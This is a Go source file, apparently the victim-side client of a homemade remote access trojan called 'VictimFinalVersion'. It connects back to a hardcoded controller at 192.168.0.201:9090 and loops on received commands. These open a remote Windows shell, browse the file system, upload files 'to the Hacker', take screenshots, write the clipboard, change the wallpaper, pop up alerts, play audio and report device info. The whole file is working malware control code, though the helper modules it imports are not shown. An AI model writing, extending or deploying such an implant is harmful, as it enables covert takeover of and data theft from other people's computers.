package main

import (
	"VictimFinalVersion/core/Download"
	"VictimFinalVersion/core/ExecuteSystemCommandWindows"
	"VictimFinalVersion/core/Move"
	"VictimFinalVersion/core/alert"
	"VictimFinalVersion/core/appdata"
	"VictimFinalVersion/core/audio"
	"VictimFinalVersion/core/clipboard"
	"VictimFinalVersion/core/device"
	"VictimFinalVersion/core/handleConnection"
	"VictimFinalVersion/core/snap"
	"VictimFinalVersion/core/upload"
	"VictimFinalVersion/core/wall"
	"bufio"
	"fmt"
	"log"
	"strings"
)

func DisplayError(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	ServerIP := "192.168.0.201"
	Port := "9090"
	connection, err := handleConnection.ConnectWithServer(ServerIP, Port)
	if err != nil {
		log.Fatal(err)
	}
	defer connection.Close()
	fmt.Print("\033[H\033[2J")
	fmt.Println("[+] Conneciton established with Server :", connection.RemoteAddr().String())

	reader := bufio.NewReader(connection)

	loopControl := true

	for loopControl {

		user_input_raw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			continue
		}

		user_input := strings.TrimSpace(user_input_raw)

		switch {
		case user_input == "shell":
			fmt.Println("[+] Executing Commands on windows")
			err := ExecuteSystemCommandWindows.ExecuteCommandWindows(connection)
			DisplayError(err)

		case user_input == "navigate":
			fmt.Println("[+] File system Naviagtion")

			err = Move.NavigateFileSystem(connection)
			DisplayError(err)

		case user_input == "upload":
			fmt.Println("[+] Downloading File From Server/HAcker")
			err = Download.ReadFileContents(connection)
			DisplayError(err)

		case user_input == "download":
			fmt.Println("[+] Uploading File to the Hacker")
			err = upload.Upload2Hacker(connection)
			DisplayError(err)

		case user_input == "snap":
			fmt.Println("[+] Snap Saved")
			err = snap.ScreenCapture(connection)
			DisplayError(err)

		case user_input == "alert":
			fmt.Println("[+] Alert Popping")
			err = alert.Dialog(connection)
			DisplayError(err)

		case user_input == "wallpaper":
			fmt.Println("[+] Waiting for irl")
			err = wall.Url(connection)
			DisplayError(err)

		case user_input == "clipboard":
			fmt.Println("Waiting for clip_wright")
			err = clipboard.Write(connection)
			DisplayError(err)

		case user_input == "appdata":
			fmt.Println("[+] Trying to change dir")
			err = appdata.Dir(connection)
			DisplayError(err)

		case user_input == "make_noise":
			fmt.Println("[+] Trying to make noise")
			err = audio.Player(connection)
			DisplayError(err)

		case user_input == "device_info":
			fmt.Println("[+] Providing playground info")
			err = device.Info(connection)
			DisplayError(err)

		case user_input == "exit":
			fmt.Println("[-] Exiting the windows program")
			loopControl = false

		case user_input == "clear" || user_input == "cls":
			fmt.Print("\033[H\033[2J")

		case user_input == "help":

		default:
			fmt.Println("[-] Invalid command")
		}
	}
}
